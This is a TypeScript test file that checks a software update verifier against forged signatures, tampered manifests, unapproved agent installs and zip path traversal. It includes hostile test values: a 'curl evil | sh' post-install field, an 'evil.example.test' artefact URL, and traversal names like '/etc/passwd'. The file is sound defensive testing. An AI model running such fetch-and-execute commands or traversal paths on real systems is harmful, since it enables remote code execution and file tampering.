import { existsSync } from "node:fs";
import { isForerunnerError, join } from "@forerunner/platform";
import { describe, expect, it } from "vitest";
import { MemoryReleaseFeed } from "../src/update/feed.ts";
import { assertSafeZipEntry } from "../src/update/install.ts";
import type { ReleaseManifest, SignedManifest } from "../src/update/manifest.ts";
import { versionsRoot } from "../src/update/pointer.ts";
import { generateSigningKeyPair, signManifest } from "../src/update/sign.ts";
import { ReleaseVerifier, refusalReason } from "../src/update/verify.ts";
import { makeHarness as harness, testKey } from "./update-helpers.ts";

/**
 * Security review of the update verifier (spec M, ADR 0015): a signature taken from one
 * release and put on another, a key id swapped for another trusted key, a signature of the
 * wrong length, an artefact URL changed after signing, a release that is signed but whose
 * version string would escape the versions directory, and zip entries that try to leave it.
 */

/** Sign and return the pair with the signature made definite (the type allows an unsigned manifest). */
function sign(m: ReleaseManifest, privateKey: string, opts?: { keyId?: string }) {
  const s = signManifest(m, privateKey, opts);
  if (!s.signature) throw new Error("signManifest returned no signature");
  const artifact = s.manifest.artifacts[0];
  if (!artifact) throw new Error("manifest without an artefact");
  return { manifest: s.manifest, signature: s.signature, artifact };
}

function manifest(version: string, over: Partial<ReleaseManifest> = {}): ReleaseManifest {
  return {
    schema: 1,
    version,
    channel: "stable",
    publishedAt: "2026-10-20T10:00:00.000Z",
    notes: `Release ${version}`,
    minSchema: 1,
    artifacts: [
      {
        platform: "linux-x64",
        name: `forerunner-${version}-linux-x64.zip`,
        url: `https://releases.example.test/${version}/linux.zip`,
        sha256: "a".repeat(64),
        size: 1234,
      },
    ],
    ...over,
  };
}

describe("release verifier: signature attacks", () => {
  const keyA = testKey();
  const keyB = generateSigningKeyPair();
  const verifier = new ReleaseVerifier([
    { id: keyA.keyId, publicKey: keyA.publicKey },
    { id: keyB.keyId, publicKey: keyB.publicKey },
  ]);

  it("a valid signature of one release does not authenticate another (notes, version, artefact url, hash, minSchema)", () => {
    const good = sign(manifest("1.1.0"), keyA.privateKey);
    expect(verifier.verifyManifest(good).keyId).toBe(keyA.keyId);
    const variants: Partial<ReleaseManifest>[] = [
      { version: "1.2.0" },
      { notes: "now with a backdoor" },
      { minSchema: 0 },
      { channel: "beta" },
      {
        artifacts: [{ ...good.artifact, url: "https://evil.example.test/linux.zip" }],
      },
      { artifacts: [{ ...good.artifact, sha256: "b".repeat(64) }] },
      { artifacts: [{ ...good.artifact, size: 1 }] },
      {
        artifacts: [good.artifact, { ...good.artifact, platform: "windows-x64", name: "w.zip" }],
      },
    ];
    for (const v of variants) {
      const forged: SignedManifest = { manifest: manifest("1.1.0", v), signature: good.signature };
      const e = (() => {
        try {
          verifier.verifyManifest(forged);
          return null;
        } catch (err) {
          return err;
        }
      })();
      expect(refusalReason(e), JSON.stringify(v)).toBe("bad_signature");
    }
  });

  it("a manifest signed by one trusted key but labelled with another trusted key id is refused", () => {
    const signed = sign(manifest("1.1.0"), keyA.privateKey, { keyId: keyB.keyId });
    let reason: string | null = null;
    try {
      verifier.verifyManifest(signed);
    } catch (e) {
      reason = refusalReason(e);
    }
    expect(reason).toBe("bad_signature");
  });

  it("signatures of the wrong length, empty, or not base64 are refused; a trailing byte is not ignored", () => {
    const good = sign(manifest("1.1.0"), keyA.privateKey);
    const sig = Buffer.from(good.signature.signature, "base64");
    for (const bad of [
      "",
      "AAAA",
      sig.subarray(0, 63).toString("base64"),
      Buffer.concat([sig, Buffer.from([0])]).toString("base64"),
      Buffer.from(sig).fill(0, 60).toString("base64"),
      "not*base64*at*all",
    ]) {
      let reason: string | null = null;
      try {
        verifier.verifyManifest({
          manifest: good.manifest,
          signature: { ...good.signature, signature: bad },
        });
      } catch (e) {
        reason = refusalReason(e);
      }
      // An empty signature fails the schema (`malformed`); every other shape is a bad signature.
      expect(["bad_signature", "malformed"], bad).toContain(reason);
    }
  });

  it("extra top-level fields are stripped before signing and verification: nothing unsigned can ride along", () => {
    const good = sign(manifest("1.1.0"), keyA.privateKey);
    const withExtra = {
      manifest: { ...good.manifest, postInstall: "curl evil | sh", artifactsExtra: [] },
      signature: good.signature,
    };
    const { manifest: m } = verifier.verifyManifest(withExtra);
    expect("postInstall" in m).toBe(false);
    expect(Object.keys(m).sort()).toEqual([
      "artifacts",
      "channel",
      "minSchema",
      "notes",
      "publishedAt",
      "schema",
      "version",
    ]);
  });
});

describe("staged install: what a signed but hostile feed can and cannot do", () => {
  it("a signed release whose artefact url moved after signing is refused before any download, and nothing is staged", async () => {
    const good = sign(manifest("1.1.0"), testKey().privateKey);
    const moved: SignedManifest = {
      manifest: manifest("1.1.0", {
        artifacts: [{ ...good.artifact, url: "http://127.0.0.1:9/never" }],
      }),
      signature: good.signature,
    };
    let fetched = 0;
    const h = await harness({ feed: new MemoryReleaseFeed([moved]) });
    h.deps.fetchImpl = async () => {
      fetched++;
      throw new Error("must not be called");
    };
    try {
      const e = await h.manager
        .apply({ by: { kind: "human", id: "j" }, version: "1.1.0" })
        .catch((x: unknown) => x);
      expect(refusalReason(e)).toBe("bad_signature");
      expect(fetched).toBe(0);
      expect(existsSync(join(versionsRoot(h.dirs), "1.1.0"))).toBe(false);
      const rows = await h.store.auditLog.list({ tool: "update.apply", allowed: false });
      expect(rows.at(-1)?.denied_reason).toBe("bad_signature");
    } finally {
      await h.close();
    }
  });

  it("an agent cannot install, roll back or re-install a previously rejected release without a human; refusals are audited", async () => {
    const good = sign(manifest("1.1.0"), testKey().privateKey);
    const h = await harness({ feed: new MemoryReleaseFeed([good]) });
    h.human.setOutcome("denied");
    try {
      const e = await h.manager
        .apply({ by: { kind: "agent", id: "alice" }, version: "1.1.0" })
        .catch((x: unknown) => x);
      expect(isForerunnerError(e, "approval_required")).toBe(true);
      expect(h.restarter.requests).toEqual([]);
      const r = await h.manager
        .rollback({ by: { kind: "agent", id: "alice" } })
        .catch((x: unknown) => x);
      expect(isForerunnerError(e) && isForerunnerError(r)).toBe(true);
      const denied = await h.store.auditLog.list({ tool: "update.apply", allowed: false });
      expect(denied.at(-1)).toMatchObject({ agent_id: "alice", denied_reason: "denied" });
    } finally {
      await h.close();
    }
  });
});

describe("zip entries that try to leave the versions directory", () => {
  it("every traversal spelling, absolute path, drive letter, backslash, NUL and symlink entry is refused by name alone", () => {
    const bad = [
      "../x",
      "a/../../x",
      "a/..",
      "..",
      "/etc/passwd",
      "C:/Windows/x",
      "c:x",
      "a\\..\\x",
      "a\0b",
      "",
    ];
    for (const name of bad) {
      expect(() => assertSafeZipEntry(name, 0), JSON.stringify(name)).toThrow();
    }
    expect(() => assertSafeZipEntry("app/link", (0o120777 << 16) >>> 0)).toThrow(/symlink/);
    for (const ok of ["app/x", "app/..x", "app/x..", "a..b/c", ".hidden"]) {
      expect(() => assertSafeZipEntry(ok, (0o100644 << 16) >>> 0), ok).not.toThrow();
    }
  });
});
